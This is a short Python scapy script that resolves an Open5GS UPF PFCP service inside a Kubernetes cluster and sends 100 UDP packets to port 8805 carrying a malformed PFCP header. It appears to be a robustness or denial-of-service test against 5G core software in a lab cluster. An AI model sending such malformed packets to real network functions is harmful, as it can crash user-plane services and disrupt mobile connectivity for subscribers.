#!/usr/bin/env python3
from scapy.all import *

dst = "my5gc-upf-pfcp.open5gs.svc.cluster.local"
dst_ip = socket.gethostbyname(dst)

malformed = IP(dst=dst_ip)/UDP(dport=8805,sport=12345)/Raw(load=b"\x20\xff\xff\xff")
send(malformed,count=100) 